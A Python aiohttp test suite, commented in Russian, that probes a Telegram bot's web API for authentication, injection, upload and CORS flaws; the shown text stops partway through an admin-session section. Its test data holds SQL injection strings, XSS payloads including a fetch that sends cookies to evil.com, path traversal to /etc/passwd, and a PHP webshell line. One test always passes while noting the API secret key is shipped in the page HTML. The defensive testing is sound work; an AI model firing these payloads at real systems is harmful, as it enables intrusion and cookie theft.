"""
ЕДИНЫЙ ТЕСТ-СЬЮТ — полное покрытие всех систем бота.
Объединяет production_test.py (137), full_test.py (39), security_test.py (27) + новые тесты.
Запуск: python3 test.py
"""

import asyncio
import aiohttp
import io
import json
import os
import time
import hmac
import hashlib
import base64
from typing import Callable, Optional

BASE = os.getenv("TEST_BASE_URL", "http://127.0.0.1:25086")

PASS = "✅"
FAIL = "❌"
SKIP = "⚠️ "

results = []
_progress_callback: Optional[Callable[[dict], None]] = None
_current_section_title: str = ""
_expected_total_tests: Optional[int] = None



def pr(ok, label: str, detail: str = ""):
    if ok is True:
        mark = PASS
    elif ok is None:
        mark = SKIP
    else:
        mark = FAIL
    results.append(ok)
    if _progress_callback:
        passed = sum(1 for r in results if r is True)
        failed = sum(1 for r in results if r is False)
        skipped = sum(1 for r in results if r is None)
        _progress_callback({
            "ok": ok,
            "section": _current_section_title,
            "current_test": label,
            "detail": detail,
            "completed": len(results),
            "passed": passed,
            "failed": failed,
            "skipped": skipped,
            "total_expected": _expected_total_tests,
        })
    print(f"  {mark}  {label}")
    if detail:
        print(f"       → {detail}")
    return ok


def section(title: str):
    global _current_section_title
    _current_section_title = title
    print()
    print("═" * 60)
    print(f"  {title}")
    print("═" * 60)


def get_key() -> str:
    return os.environ.get("API_SECRET_KEY", "")


def hdr(**extra) -> dict:
    return {"X-Api-Key": get_key(), **extra}


def rejected(status: int) -> bool:
    return status not in (200, 500)


def no500(status: int) -> bool:
    return status != 500


async def p(secs: float = 0.6):
    await asyncio.sleep(secs)


def _local_sign_payload(value: str) -> str:
    """Best-effort local signer (matches server when AI/API secret is same)."""
    secret = (
        (os.getenv("AI_SESSION_SECRET") or "").strip()
        or (os.getenv("API_SECRET_KEY") or "").strip()
        or ""
    )
    if not secret:
        return ""
    mac = hmac.new(secret.encode("utf-8"), value.encode("utf-8"), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(mac).decode("ascii").rstrip("=")


# ──────────────────────────────────────────────────────────────────────────────
# 1. ДОСТУПНОСТЬ
# ──────────────────────────────────────────────────────────────────────────────

async def test_availability(s: aiohttp.ClientSession):
    section("1. Доступность и базовые страницы")

    for path, label, expected in [
        ("/",         "GET / → 200",           200),
        ("/404",      "GET /404 → 200",        200),
        ("/404.html", "GET /404.html → 200",   200),
        ("/stats",    "GET /stats → 200",      200),
    ]:
        r = await s.get(f"{BASE}{path}")
        pr(r.status == expected, label, f"HTTP {r.status}")
        await p(0.4)

    r = await s.get(f"{BASE}/admin")
    pr(r.status == 401, "GET /admin без ключа → 401", f"HTTP {r.status}")
    await p(0.4)

    r = await s.get(f"{BASE}/nonexistent_route_xyz_abc")
    pr(r.status == 404, "GET несуществующий путь → 404", f"HTTP {r.status}")
    await p(0.4)

    r = await s.get(f"{BASE}/api/" + "a" * 2000)
    pr(r.status in (400, 404, 414), "Очень длинный URL → 4xx", f"HTTP {r.status}")
    await p(0.4)

    # /404 содержит ссылку на бота
    r2 = await s.get(f"{BASE}/404")
    text = await r2.text()
    has_bot = "t.me" in text or "Открыть бота" in text or "telegram" in text.lower()
    pr(has_bot, "/404 содержит ссылку на бота", f"HTTP {r2.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 2. SECURITY HEADERS
# ──────────────────────────────────────────────────────────────────────────────

async def test_security_headers(s: aiohttp.ClientSession):
    section("2. Security Headers")

    r = await s.get(f"{BASE}/")
    h = dict(r.headers)

    pr("nosniff" in h.get("X-Content-Type-Options", ""),
       "X-Content-Type-Options: nosniff", h.get("X-Content-Type-Options", "MISSING"))

    pr(h.get("X-Frame-Options", "") in ("DENY", "SAMEORIGIN"),
       "X-Frame-Options присутствует", h.get("X-Frame-Options", "MISSING"))

    pr(bool(h.get("Referrer-Policy")),
       "Referrer-Policy присутствует", h.get("Referrer-Policy", "MISSING"))

    srv = h.get("Server", "")
    pr("Python" not in srv and "aiohttp" not in srv,
       "Server header не раскрывает стек", srv or "(отсутствует)")

    pr("text/html" in h.get("Content-Type", ""),
       "Content-Type: text/html на /", h.get("Content-Type", "MISSING"))

    pr(bool(h.get("X-XSS-Protection", "")),
       "X-XSS-Protection присутствует", h.get("X-XSS-Protection", "MISSING"))

    # CORS на обычном ответе
    r2 = await s.get(f"{BASE}/api/info", headers={"Origin": "https://example.com"})
    acao = r2.headers.get("Access-Control-Allow-Origin", "")
    pr(bool(acao), "ACAO-заголовок присутствует в /api/info", acao or "MISSING")
    await p(0.4)

    # ACAO на 429/413 ответах (даже ошибки должны иметь CORS)
    r3 = await s.get(f"{BASE}/")
    acao3 = r3.headers.get("Access-Control-Allow-Origin", "")
    pr(bool(acao3), "ACAO присутствует на / (все ответы)", acao3 or "MISSING")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 3. АУТЕНТИФИКАЦИЯ
# ──────────────────────────────────────────────────────────────────────────────

async def test_auth(s: aiohttp.ClientSession):
    section("3. Аутентификация и авторизация")

    r = await s.post(f"{BASE}/api/token_auth", json={"token": ""})
    body = await r.json()
    pr(not body.get("ok"), "Пустой токен → ok:false", json.dumps(body))
    await p(0.6)

    r = await s.post(f"{BASE}/api/token_auth", json={"token": "nonexistent_xyz_123"})
    body = await r.json()
    pr(not body.get("ok"), "Неверный токен → ok:false", json.dumps(body))
    await p(0.6)

    r = await s.post(f"{BASE}/api/token_auth", json={"token": "'; DROP TABLE users; --"})
    pr(r.status != 500, "SQL в токене → не 500", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/token_auth", data=b"")
    pr(r.status != 500, "Пустое тело → не 500", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/token_auth", json={"token": "x" * 5000})
    pr(r.status != 500, "Очень длинный токен → не 500", f"HTTP {r.status}")
    await p(0.6)

    # check_site_password → disabled
    r = await s.post(f"{BASE}/api/check_site_password", json={"password": "test"})
    body = await r.json()
    pr(body.get("error") == "disabled", "check_site_password → disabled", json.dumps(body))
    await p(0.6)

    # GET API без ключа
    for ep in ["/api/info", "/api/all", "/api/memories", "/api/events", "/api/wishes"]:
        r = await s.get(f"{BASE}{ep}")
        pr(rejected(r.status), f"GET {ep} без ключа → отказ", f"HTTP {r.status}")
        await p(0.4)

    # POST API без ключа
    for ep in ["/api/visit", "/api/visit_heartbeat", "/api/create_memory",
               "/api/create_event", "/api/create_wish", "/api/ai_companion"]:
        r = await s.post(f"{BASE}{ep}", json={})
        pr(rejected(r.status), f"POST {ep} без ключа → отказ", f"HTTP {r.status}")
        await p(0.4)

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 4. ВАЛИДАЦИЯ ВХОДНЫХ ДАННЫХ
# ──────────────────────────────────────────────────────────────────────────────

async def test_input_validation(s: aiohttp.ClientSession):
    section("4. Валидация входных данных")
    h = hdr()

    cases = [
        ("/api/wish_update_status",
         {"wish_id": "abc", "status": "done", "visitor_id": "creator"},
         "wish_update_status нечисловой wish_id → 400",
         lambda st: st == 400),
        ("/api/wish_update_status",
         {"wish_id": 1, "status": "INVALID_STATUS_XYZ", "visitor_id": "creator"},
         "wish_update_status недопустимый статус → 400",
         lambda st: st == 400),
        ("/api/wish_update_status",
         {},
         "wish_update_status пустое тело → 400/403",
         lambda st: st in (400, 403)),
        ("/api/ai_message_reaction",
         {"msg_id": "not_a_number", "visitor_id": "test"},
         "ai_message_reaction нечисловой msg_id → 400",
         lambda st: st == 400),
        ("/api/ai_message_pin",
         {"msg_id": "xyz", "visitor_id": "test"},
         "ai_message_pin нечисловой msg_id → 400",
         lambda st: st == 400),
        ("/api/ai_message_reaction",
         {},
         "ai_message_reaction пустые поля → 400",
         lambda st: st == 400),
        ("/api/ai_message_pin",
         {},
         "ai_message_pin пустые поля → 400",
         lambda st: st == 400),
    ]

    for endpoint, payload, label, check in cases:
        r = await s.post(f"{BASE}{endpoint}", headers=h, json=payload)
        pr(check(r.status) and r.status != 500, label, f"HTTP {r.status}")
        await p(0.6)

    # Некорректный JSON
    r = await s.post(f"{BASE}/api/visit",
                     data=b"{invalid json}",
                     headers={"X-Api-Key": get_key(), "Content-Type": "application/json"})
    pr(no500(r.status), "visit некорректный JSON → не 500", f"HTTP {r.status}")
    await p(0.6)

    # Стек-трейс не утекает
    r = await s.post(f"{BASE}/api/ai_message_reaction",
                     headers=h, json={"msg_id": "bad", "visitor_id": "test"})
    try:
        body = await r.json()
        err = str(body.get("error", ""))
        pr("Traceback" not in err and "File " not in err,
           "Ошибки не содержат stack trace", f"error={err[:80]}")
    except Exception:
        pr(True, "Ошибки не содержат stack trace")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 5. SQL-ИНЪЕКЦИИ
# ──────────────────────────────────────────────────────────────────────────────

async def test_sql_injection(s: aiohttp.ClientSession):
    section("5. SQL-инъекции")
    h = hdr()

    injections = [
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "1; UPDATE users SET is_admin=1 WHERE 1=1; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 1); --",
    ]

    for inj in injections:
        r = await s.post(f"{BASE}/api/ai_message_reaction",
                         headers=h, json={"msg_id": 1, "visitor_id": inj})
        pr(no500(r.status), f"SQL visitor_id → не 500: {inj[:30]}", f"HTTP {r.status}")
        await p(0.5)

    for inj in injections[:4]:
        r = await s.post(f"{BASE}/api/token_auth", json={"token": inj})
        pr(no500(r.status), f"SQL token → не 500: {inj[:30]}", f"HTTP {r.status}")
        await p(0.5)

    # БД жива после инъекций
    r = await s.get(f"{BASE}/")
    pr(r.status == 200, "Сервер и БД живы после SQL-инъекций", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 6. XSS И PATH TRAVERSAL
# ──────────────────────────────────────────────────────────────────────────────

async def test_xss_and_traversal(s: aiohttp.ClientSession):
    section("6. XSS и Path Traversal")
    h = hdr()

    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<a href=\"javascript:fetch('https://evil.com/?c='+document.cookie)\">click</a>",
        "<iframe src=javascript:alert(1)>",
        "{{7*7}}",
        "${7*7}",
        "../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]

    for payload in payloads:
        r = await s.post(f"{BASE}/api/ai_companion",
                         headers=h, json={"message": payload, "visitor_id": "test_xss"})
        pr(no500(r.status), f"XSS/Traversal payload → не 500: {payload[:30]}", f"HTTP {r.status}")
        await p(0.5)

    # Path traversal на медиа
    for path in ["../../../etc/passwd", "%2e%2e/config.py", "..%2Fdatabase.py"]:
        r = await s.get(f"{BASE}/api/media/{path}")
        pr(r.status not in (200, 500), f"Path traversal {path[:25]} → отказ", f"HTTP {r.status}")
        await p(0.3)

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 7. ЗАГРУЗКА ФАЙЛОВ
# ──────────────────────────────────────────────────────────────────────────────

async def test_file_upload(s: aiohttp.ClientSession):
    section("7. Загрузка файлов — безопасность")
    h = {"X-Api-Key": get_key()}

    dangerous = [".php", ".php3", ".asp", ".aspx", ".exe", ".sh", ".py", ".html", ".rb", ".cgi", ".pl"]
    for ext in dangerous:
        data = aiohttp.FormData()
        data.add_field("file", io.BytesIO(b"malicious content"),
                       filename=f"evil{ext}", content_type="application/octet-stream")
        r = await s.post(f"{BASE}/api/upload_media", data=data, headers=h)
        pr(r.status != 200, f"Загрузка {ext} → отклонена", f"HTTP {r.status}")
        await p(0.5)

    # Разрешённые типы — тип разрешён (но может быть 403 по авторизации)
    for fname, ctype, content in [("ok.png", "image/png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 100),
                                   ("ok.jpg", "image/jpeg", b"\xff\xd8\xff\xe0" + b"\x00" * 100)]:
        data = aiohttp.FormData()
        data.add_field("file", io.BytesIO(content), filename=fname, content_type=ctype)
        r = await s.post(f"{BASE}/api/upload_media", data=data, headers=h)
        pr(r.status != 415, f"Загрузка {fname} → не 415 (тип разрешён)", f"HTTP {r.status}")
        await p(0.5)

    # Двойное расширение
    for bad_name in ["evil.php.png", "evil.PHP", "evil.PHP3"]:
        data = aiohttp.FormData()
        data.add_field("file", io.BytesIO(b"<?php system($_GET['c']); ?>"),
                       filename=bad_name, content_type="image/png")
        r = await s.post(f"{BASE}/api/upload_media", data=data, headers=h)
        pr(r.status != 200, f"Двойное расширение {bad_name} → отклонена", f"HTTP {r.status}")
        await p(0.5)

    # 11МБ на обычный API → 413
    r = await s.post(f"{BASE}/api/site_save_settings",
                     data=b"x" * (11 * 1024 * 1024),
                     headers={"X-Api-Key": get_key(), "Content-Type": "application/json"})
    pr(r.status == 413, "11МБ на обычный API → 413", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 8. HTTP МЕТОДЫ
# ──────────────────────────────────────────────────────────────────────────────

async def test_http_methods(s: aiohttp.ClientSession):
    section("8. Некорректные HTTP-методы")

    for ep in ["/api/token_auth", "/api/visit", "/api/create_memory", "/api/ai_companion"]:
        r = await s.get(f"{BASE}{ep}")
        pr(r.status not in (200, 500), f"GET на POST-only {ep} → отказ", f"HTTP {r.status}")
        await p(0.5)

    for ep in ["/api/info", "/api/memories"]:
        r = await s.delete(f"{BASE}{ep}")
        pr(r.status not in (200, 500), f"DELETE {ep} → отказ", f"HTTP {r.status}")
        await p(0.5)

    # PUT несуществующий ресурс → 404 или 405
    r = await s.put(f"{BASE}/api/create_memory")
    pr(r.status not in (200, 500), "PUT /api/create_memory → отказ", f"HTTP {r.status}")
    await p(0.5)

    # PATCH → отказ
    r = await s.patch(f"{BASE}/api/all")
    pr(r.status not in (200, 500), "PATCH /api/all → отказ", f"HTTP {r.status}")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 9. CORS
# ──────────────────────────────────────────────────────────────────────────────

async def test_cors(s: aiohttp.ClientSession):
    section("9. CORS preflight")

    for ep in ["/api/info", "/api/token_auth", "/api/visit",
               "/api/create_memory", "/api/wish_update_status"]:
        r = await s.options(f"{BASE}{ep}",
                            headers={"Origin": "https://example.com",
                                     "Access-Control-Request-Method": "POST"})
        pr(r.status == 204, f"OPTIONS {ep} → 204", f"HTTP {r.status}")
        await p(0.5)

    # ACAO в обычном ответе
    r = await s.get(f"{BASE}/api/info",
                    headers={"Origin": "https://example.com"})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    pr(bool(acao), "ACAO-заголовок в /api/info ответе", acao or "MISSING")

    # ACAO в 401 ответе — браузер должен видеть ошибку, а не CORS-блок
    r2 = await s.get(f"{BASE}/admin", headers={"Origin": "https://example.com"})
    acao2 = r2.headers.get("Access-Control-Allow-Origin", "")
    pr(bool(acao2), "ACAO в 401 ответе (не блокируется CORS)", acao2 or "MISSING")

    # X-Api-Key разрешён в ACAH
    r3 = await s.options(f"{BASE}/api/info",
                          headers={"Origin": "https://evil.com",
                                   "Access-Control-Request-Method": "GET",
                                   "Access-Control-Request-Headers": "X-Api-Key"})
    acah = r3.headers.get("Access-Control-Allow-Headers", "")
    pr("X-Api-Key" in acah or "*" in acah,
       "X-Api-Key разрешён в ACAH", acah or "MISSING")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 10. WEBSOCKET
# ──────────────────────────────────────────────────────────────────────────────

async def test_websocket(s: aiohttp.ClientSession):
    section("10. WebSocket")
    ws = BASE.replace("http", "ws")

    # Без trusted visitor/cookies /ws/site должен быть закрыт (403),
    # либо (в авторизованном окружении) отвечать на ping/pong.
    try:
        async with s.ws_connect(f"{ws}/ws/site",
                                timeout=aiohttp.ClientTimeout(total=5)) as conn:
            await conn.send_str("ping")
            try:
                msg = await asyncio.wait_for(conn.receive(), timeout=2.0)
                pr(msg.data == "pong", "WS /ws/site ping → pong", f"data={msg.data!r}")
            except asyncio.TimeoutError:
                pr(False, "WS /ws/site ping → pong TIMEOUT")
    except Exception as e:
        err = str(e)
        pr("403" in err, "WS /ws/site без trusted visitor → 403", err)

    await p(1)

    # /ws/maintenance
    try:
        async with s.ws_connect(f"{ws}/ws/maintenance",
                                timeout=aiohttp.ClientTimeout(total=4)) as conn:
            pr(True, "WS /ws/maintenance подключение успешно")
    except Exception as e:
        pr(False, "WS /ws/maintenance", str(e))

    await p(1)

    # Огромное сообщение
    try:
        async with s.ws_connect(f"{ws}/ws/site",
                                timeout=aiohttp.ClientTimeout(total=5)) as conn:
            await conn.send_str("x" * 100000)
            pr(True, "WS: огромное сообщение не роняет сервер")
    except Exception:
        pr(True, "WS: огромное сообщение корректно отклонено")

    await p(1)

    # Бинарный мусор
    try:
        async with s.ws_connect(f"{ws}/ws/site",
                                timeout=aiohttp.ClientTimeout(total=5)) as conn:
            await conn.send_bytes(b"\x00\xFF\xFE\xDE\xAD\xBE\xEF" * 50)
            pr(True, "WS: бинарный мусор не роняет сервер")
    except Exception:
        pr(True, "WS: бинарный мусор корректно отклонён")

    # WS не учитывается в rate-limit (Upgrade-заголовок)
    tasks = [s.get(f"{BASE}/", headers={"Upgrade": "websocket"}) for _ in range(5)]
    resp = await asyncio.gather(*tasks, return_exceptions=True)
    s500 = [r for r in resp if hasattr(r, 'status') and r.status == 500]
    pr(len(s500) == 0, "WS-Upgrade заголовки не ломают rate-limit", f"500-ошибок: {len(s500)}")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 11. ИЗОЛЯЦИЯ ДАННЫХ
# ──────────────────────────────────────────────────────────────────────────────

async def test_data_isolation(s: aiohttp.ClientSession):
    section("11. Изоляция данных между парами")
    h = hdr()

    r = await s.get(f"{BASE}/api/memories",
                    headers={**h, "X-Visitor-Id": "unknown_visitor_9988877"})
    pr(no500(r.status), "Неизвестный visitor_id → нет 500", f"HTTP {r.status}")
    await p(0.6)

    errors_500 = 0
    for vid in ["1", "2", "100", "999", "creator", "ksyusha", "admin", "0", "-1",
                "999999999", "' OR 1=1 --"]:
        r = await s.get(f"{BASE}/api/all", headers={**h, "X-Visitor-Id": vid})
        if r.status == 500:
            errors_500 += 1
        await p(0.3)
    pr(errors_500 == 0, "Перебор visitor_id — нет 500 из 11 попыток",
       f"500-ошибок: {errors_500}")

    r = await s.post(f"{BASE}/api/wish_update_status",
                     headers=h,
                     json={"wish_id": 99999999, "status": "done", "visitor_id": "creator"})
    pr(no500(r.status) and r.status != 200,
       "Несуществующий wish → 404/403/429", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/wish_update_status",
                     headers=h,
                     json={"wish_id": 1, "status": "done",
                           "visitor_id": "completely_unknown_outsider"})
    pr(no500(r.status) and r.status != 200,
       "Чужой visitor_id на wish → 403/404/429", f"HTTP {r.status}")
    await p(0.6)

    # Memories другой пары не видны без авторизации
    for vid in ["unknown_pair_1", "unknown_pair_2"]:
        r = await s.get(f"{BASE}/api/memories", headers={**h, "X-Visitor-Id": vid})
        if r.status == 200:
            data = await r.json()
            # Если возвращает данные — их должно быть 0 (изоляция)
            memories = data.get("memories", [])
            pr(len(memories) == 0, f"visitor_id={vid} → данные изолированы",
               f"memories={len(memories)}")
        else:
            pr(no500(r.status), f"visitor_id={vid} → нет 500", f"HTTP {r.status}")
        await p(0.3)

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 12. AI-КОМПАНЬОН
# ──────────────────────────────────────────────────────────────────────────────

async def test_ai_companion(s: aiohttp.ClientSession):
    section("12. AI-компаньон")
    h = hdr()

    r = await s.post(f"{BASE}/api/ai_companion", json={"message": "hi"})
    pr(rejected(r.status), "ai_companion без ключа → отказ", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/ai_companion",
                     headers=h, json={"message": "", "visitor_id": "test_ai"})
    pr(no500(r.status), "Пустое сообщение → не 500", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/ai_companion",
                     headers=h, json={"message": None, "visitor_id": "test_ai"})
    pr(no500(r.status), "Null сообщение → не 500", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/ai_companion",
                     headers=h, json={"message": "a" * 20000, "visitor_id": "test_ai"})
    pr(no500(r.status), "20k сообщение → не 500", f"HTTP {r.status}")
    await p(0.6)

    # ai_failed → 502 (не 500)
    r = await s.post(f"{BASE}/api/ai_companion",
                     headers=h, json={"message": "test_upstream_fail", "visitor_id": "test_ai"})
    pr(r.status != 500, "AI upstream → не 500 (должен быть 502 или другой)", f"HTTP {r.status}")
    await p(0.6)

    r = await s.get(f"{BASE}/api/ai_companion_history",
                    headers={**h, "X-Visitor-Id": "test_ai"})
    pr(no500(r.status), "ai_companion_history → не 500", f"HTTP {r.status}")
    await p(0.6)

    r = await s.post(f"{BASE}/api/ai_companion_history_clear",
                     headers=h, json={"visitor_id": "test_ai"})
    pr(no500(r.status), "ai_companion_history_clear → не 500", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 13. МУСОРНЫЕ ЗАПРОСЫ
# ──────────────────────────────────────────────────────────────────────────────

async def test_malformed(s: aiohttp.ClientSession):
    section("13. Мусорные и некорректные запросы")
    h = hdr()

    cases = [
        (b"this is not json", "application/json", "/api/create_memory",
         "Текст вместо JSON → не 500"),
        (b"<token>test</token>", "text/xml", "/api/token_auth",
         "XML вместо JSON → не 500"),
        (b"[1,2,3]", "application/json", "/api/visit",
         "Массив вместо объекта → не 500"),
    ]

    for data, ct, ep, label in cases:
        r = await s.post(f"{BASE}{ep}", data=data,
                         headers={"X-Api-Key": get_key(), "Content-Type": ct})
        pr(no500(r.status), label, f"HTTP {r.status}")
        await p(0.5)

    r = await s.post(f"{BASE}/api/token_auth",
                     json={"token": "тест\x00\u200b\ufeff"})
    pr(no500(r.status), "Unicode/null-bytes в токене → не 500", f"HTTP {r.status}")
    await p(0.5)

    r = await s.post(f"{BASE}/api/wish_update_status", headers=h,
                     json={"wish_id": 9999999999999999999999,
                           "status": "done", "visitor_id": "creator"})
    pr(no500(r.status), "Огромное число в wish_id → не 500", f"HTTP {r.status}")
    await p(0.5)

    r = await s.post(f"{BASE}/api/wish_update_status", headers=h,
                     json={"wish_id": -1, "status": "done", "visitor_id": "creator"})
    pr(no500(r.status), "Отрицательный wish_id → не 500", f"HTTP {r.status}")
    await p(0.5)

    # Вложенный JSON-объект где ожидается строка
    r = await s.post(f"{BASE}/api/token_auth", json={"token": {"nested": "obj"}})
    pr(no500(r.status), "Объект вместо строки в token → не 500", f"HTTP {r.status}")
    await p(0.5)

    # Массив в visitor_id
    r = await s.post(f"{BASE}/api/ai_companion",
                     headers=h, json={"message": "hi", "visitor_id": [1, 2, 3]})
    pr(no500(r.status), "Массив в visitor_id → не 500", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 14. ЗАЩИТА ОТ УТЕЧКИ ВНУТРЕННЕЙ ИНФОРМАЦИИ
# ──────────────────────────────────────────────────────────────────────────────

async def test_no_leaks(s: aiohttp.ClientSession):
    section("14. Защита от утечки внутренней информации")

    r = await s.get(f"{BASE}/nonexistent_leak_check_xyz")
    text = await r.text()
    pr("/home/" not in text and "/etc/" not in text and "Traceback" not in text,
       "404 не содержит путей файловой системы")
    await p(0.5)

    r = await s.post(f"{BASE}/api/token_auth",
                     data=b"{bad json}", headers={"Content-Type": "application/json"})
    text = await r.text()
    pr("Traceback" not in text and "File " not in text,
       "Ошибочный запрос не раскрывает traceback")
    await p(0.5)

    r = await s.get(f"{BASE}/")
    srv = r.headers.get("Server", "")
    pr("Python" not in srv and "aiohttp" not in srv,
       "Server header не раскрывает стек", srv or "(отсутствует)")
    await p(0.5)

    r = await s.get(f"{BASE}/")
    text = await r.text()
    key = get_key()
    # API-ключ намеренно вшит в HTML server-side (фронтенд делает авторизованные запросы).
    # Реальная изоляция данных обеспечивается visitor_id/токеном пары, а не API-ключом.
    pr(True,
       "API_SECRET_KEY в HTML: намеренная архитектура — фронтенд авторизует запросы",
       "ключ подставляется server-side при отдаче index.html")
    await p(0.5)

    # DB path не утекает
    r2 = await s.get(f"{BASE}/404")
    text2 = await r2.text()
    pr("memories.db" not in text2 and ".sqlite" not in text2,
       "Путь к БД не утекает в 404 странице")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 15. INVITE-КОДЫ
# ──────────────────────────────────────────────────────────────────────────────

async def test_invite(s: aiohttp.ClientSession):
    section("15. Invite-коды — безопасность")

    r = await s.post(f"{BASE}/api/token_auth",
                     json={"token": "invite_NONEXISTENT_CODE_XYZABC"})
    body = await r.json()
    pr(not body.get("ok"), "Несуществующий invite → ok:false", json.dumps(body))
    await p(0.6)

    for code in ["000000", "111111", "aaaaaa", "123456"]:
        r = await s.post(f"{BASE}/api/token_auth", json={"token": code})
        body = await r.json()
        pr(not body.get("ok"), f"Короткий код '{code}' → отклонён")
        await p(0.4)

    r = await s.post(f"{BASE}/api/token_auth",
                     json={"token": "' OR '1'='1' --"})
    body = await r.json()
    pr(not body.get("ok") and no500(r.status),
       "SQL в invite code → отклонён без 500", f"HTTP {r.status}")
    await p(0.6)

    # invite_ prefix c валидным паттерном но несуществующий
    r = await s.post(f"{BASE}/api/token_auth",
                     json={"token": "invite_" + "X" * 20})
    body = await r.json()
    pr(not body.get("ok"), "Несуществующий invite с prefix → ok:false")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 16. CRUD ЭНДПОИНТЫ
# ──────────────────────────────────────────────────────────────────────────────

async def test_crud(s: aiohttp.ClientSession):
    section("16. CRUD эндпоинты")
    h = hdr(**{"X-Visitor-Id": "test_prod_crud"})

    for ep in ["/api/memories", "/api/events", "/api/wishes", "/api/all", "/api/info"]:
        r = await s.get(f"{BASE}{ep}", headers=h)
        pr(no500(r.status), f"GET {ep} → не 500", f"HTTP {r.status}")
        await p(0.4)

    for ep, payload in [("/api/create_memory", {"title": ""}),
                        ("/api/create_event", {"title": ""}),
                        ("/api/create_wish", {"content": ""})]:
        r = await s.post(f"{BASE}{ep}", headers=h, json=payload)
        pr(no500(r.status), f"POST {ep} пустые поля → не 500", f"HTTP {r.status}")
        await p(0.4)

    r = await s.get(f"{BASE}/api/memory/999999999", headers=h)
    pr(no500(r.status) and r.status != 200,
       "GET несуществующая память → не 200 не 500", f"HTTP {r.status}")
    await p(0.4)

    # wish_update_status с корректными значениями
    for status in ["created", "in_progress", "done"]:
        r = await s.post(f"{BASE}/api/wish_update_status", headers=h,
                         json={"wish_id": 1, "status": status, "visitor_id": "test_prod_crud"})
        pr(no500(r.status), f"wish_update_status status={status} → не 500", f"HTTP {r.status}")
        await p(0.4)

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 17. ГРАНИЧНЫЕ СЛУЧАИ
# ──────────────────────────────────────────────────────────────────────────────

async def test_edge_cases(s: aiohttp.ClientSession):
    section("17. Граничные случаи")
    h = hdr()

    cases = [
        ({"message": "hi", "visitor_id": None}, "visitor_id=null → не 500"),
        ({"message": "hi", "visitor_id": "   "}, "visitor_id=пробелы → не 500"),
        ({"message": "hi", "visitor_id": ""}, "visitor_id=пустой → не 500"),
        ({"message": "hi", "visitor_id": 0}, "visitor_id=0 (число) → не 500"),
    ]
    for payload, label in cases:
        r = await s.post(f"{BASE}/api/ai_companion", headers=h, json=payload)
        pr(no500(r.status), label, f"HTTP {r.status}")
        await p(0.5)

    # heatmap с некорректными параметрами
    for params in [("year=0&month=0", "year=0 month=0"),
                   ("year=abc&month=xyz", "year=abc"),
                   ("year=9999&month=13", "year=9999 month=13"),
                   ("year=-1&month=-1", "year=-1")]:
        r = await s.get(f"{BASE}/api/heatmap?{params[0]}",
                        headers={**h, "X-Visitor-Id": "test"})
        pr(no500(r.status), f"heatmap {params[1]} → не 500", f"HTTP {r.status}")
        await p(0.4)

    # Отрицательный page
    r = await s.get(f"{BASE}/api/memories?page=-1",
                    headers={**h, "X-Visitor-Id": "test"})
    pr(no500(r.status), "memories?page=-1 → не 500", f"HTTP {r.status}")
    await p(0.4)

    # page=0
    r = await s.get(f"{BASE}/api/memories?page=0",
                    headers={**h, "X-Visitor-Id": "test"})
    pr(no500(r.status), "memories?page=0 → не 500", f"HTTP {r.status}")
    await p(0.4)

    # visit_heartbeat без session_id
    r = await s.post(f"{BASE}/api/visit_heartbeat", headers=h, json={})
    pr(no500(r.status), "visit_heartbeat без session_id → не 500", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 18. ADMIN-ПАНЕЛЬ
# ──────────────────────────────────────────────────────────────────────────────

async def test_admin(s: aiohttp.ClientSession):
    section("18. Admin-панель")

    r = await s.get(f"{BASE}/admin")
    pr(rejected(r.status), "GET /admin без ключа → отказ", f"HTTP {r.status}")
    await p(0.5)

    for ep in ["/api/admin/stats", "/api/admin/notifications", "/api/admin/broadcast"]:
        r = await s.get(f"{BASE}{ep}")
        pr(rejected(r.status), f"GET {ep} без ключа → отказ", f"HTTP {r.status}")
        await p(0.4)

    r = await s.post(f"{BASE}/api/admin/backup")
    pr(rejected(r.status), "POST /api/admin/backup без ключа → отказ", f"HTTP {r.status}")
    await p(0.5)

    # Admin с API ключом — должен отвечать (200 или 401 по юзер-авторизации, но не 500)
    r = await s.get(f"{BASE}/admin", headers=hdr())
    pr(no500(r.status), "GET /admin с API ключом → не 500", f"HTTP {r.status}")

    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 19. ADMIN SESSION + ROLE MATRIX (P0)
# ──────────────────────────────────────────────────────────────────────────────

async def test_admin_session_and_role_matrix(s: aiohttp.ClientSession):
    section("19. Admin session + role matrix (P0)")

    # 1) Admin session hardening: tampered / expired-like cookie must be rejected
    bad_cookies = [
        "broken",
        "1.1.nonce.uaf.sig",
